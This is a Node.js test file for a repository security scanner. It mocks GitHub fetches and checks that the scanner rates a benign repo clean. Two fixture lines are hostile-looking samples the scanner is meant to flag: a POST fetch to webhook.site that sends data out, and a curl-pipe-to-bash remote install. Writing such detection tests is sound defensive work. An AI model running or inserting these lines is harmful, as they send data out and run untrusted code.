import assert from "node:assert/strict";
import test from "node:test";

import { scanRepo, scanRepoMcpOutputSchema } from "./scan.mjs";

function jsonResponse(body, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "content-type": "application/json" },
  });
}

function textResponse(body, status = 200) {
  return new Response(body, { status, headers: { "content-type": "text/plain" } });
}

async function withFetch(impl, fn) {
  const original = globalThis.fetch;
  globalThis.fetch = impl;
  try {
    return await fn();
  } finally {
    globalThis.fetch = original;
  }
}

function githubFetch({ owner = "owner", repo = "name", branch = "main", files = { "index.js": "console.log(1);\n" } } = {}) {
  return async (url) => {
    const target = String(url);
    if (target.includes("/git/trees/")) {
      return jsonResponse({
        tree: Object.keys(files).map((path) => ({ type: "blob", path, size: files[path].length })),
      });
    }
    if (new URL(target).pathname === `/repos/${owner}/${repo}`) {
      return jsonResponse({ default_branch: branch });
    }
    if (target.startsWith(`https://raw.githubusercontent.com/${owner}/${repo}/${branch}/`)) {
      const path = decodeURIComponent(target.split(`/${branch}/`)[1]);
      if (!(path in files)) return textResponse("", 404);
      return textResponse(files[path]);
    }
    throw new Error(`unexpected fetch ${target}`);
  };
}

test("scanRepo returns a closed clean-risk object for a benign public repo", async () => {
  const result = await withFetch(githubFetch(), () => scanRepo("owner/name"));
  assert.equal(result.ok, true);
  assert.equal(result.repo, "owner/name");
  assert.equal(result.branch, "main");
  assert.equal(result.risk, "clean");
  assert.equal(result.filesScanned, 1);
  assert.deepEqual(result.findings, []);
  const parsed = scanRepoMcpOutputSchema.safeParse(result);
  assert.equal(parsed.success, true, parsed.error);
  assert.equal(scanRepoMcpOutputSchema.safeParse({ ...result, extra: true }).success, false);
});

test("scanRepo labels exfil sinks dangerous and install-time exec suspicious", async () => {
  const dangerous = await withFetch(
    githubFetch({ files: { "exfil.js": "fetch('https://webhook.site/abc', { method: 'POST' });\n" } }),
    () => scanRepo("https://github.com/owner/name"),
  );
  assert.equal(dangerous.risk, "dangerous");
  assert.equal(dangerous.findings[0].severity, "danger");
  assert.equal(scanRepoMcpOutputSchema.safeParse(dangerous).success, true);

  const suspicious = await withFetch(
    githubFetch({ files: { "install.sh": "curl https://example.com/install | bash\n" } }),
    () => scanRepo("owner/name"),
  );
  assert.equal(suspicious.risk, "suspicious");
  assert.equal(suspicious.findings[0].severity, "warn");
  assert.equal(scanRepoMcpOutputSchema.safeParse(suspicious).success, true);
});

test("scanRepo fails closed before payment-shaped output on a malformed repo", async () => {
  await assert.rejects(() => scanRepo("not a repo"), /owner\/name/);
});
